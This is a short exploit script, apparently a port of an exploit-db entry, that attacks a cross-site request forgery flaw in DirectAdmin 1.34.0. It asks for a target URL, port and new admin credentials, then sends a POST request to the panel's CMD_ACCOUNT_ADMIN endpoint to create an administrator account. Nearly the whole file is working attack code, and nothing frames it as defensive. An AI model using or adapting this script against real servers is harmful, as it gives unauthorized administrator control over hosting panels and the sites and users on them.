/**
* Title: DirectAdmin 1.34.0 - CSRF Create Administrator Vulnerability
* Discovered by: SecurityRules
* Exploit from https://www.exploit-db.com/exploits/10779/
*/

load "http/curl"

print "DirectAdmin 1.34.0 CSRF Create Administrator Vulnerability\n"

print "URL Target: "
input.start()
    @url = input.value
input.close()

print "Port Target: "
input.start()
    @port = input.value
input.close()

print "Create admin username: "
input.start()
    @username = input.value
input.close()

print "Create admin email: "
input.start()
    @email = input.value
input.close()

print "Create admin password: "
input.start()
    @password = input.value
    @url = @url.":".@port."/CMD_ACCOUNT_ADMIN"
    @exploit = array("action"=> "create", "username"=> @username, "passwd"=> @password, "passwd2"=> @password)
    @result = curl.post(@url, @exploit)
input.close()